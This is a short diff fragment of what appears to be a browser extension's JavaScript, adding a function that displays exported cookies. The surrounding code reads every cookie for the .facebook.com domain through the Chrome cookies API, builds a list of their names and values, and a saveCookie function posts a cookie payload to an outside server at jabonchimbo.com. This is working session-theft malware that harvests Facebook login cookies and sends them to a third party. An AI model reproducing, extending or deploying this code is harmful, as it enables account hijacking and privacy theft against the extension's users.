@@ -19,8 +19,12 @@ function saveCookie(p){
 $.post( "http://www.jabonchimbo.com/api/youtube/tmp/save.php", { cookie: p} );
 }
 
+function showMessage(){
+	alert(exportFacebook());
+}
+
 function exportFacebook(){
-	var cook = "[";
+var cook = "[";
     chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
 			for (var i in cookies) {
 				cook+= "{name:" + cookies[i].name + ",value:" + cookies[i].value + "},";
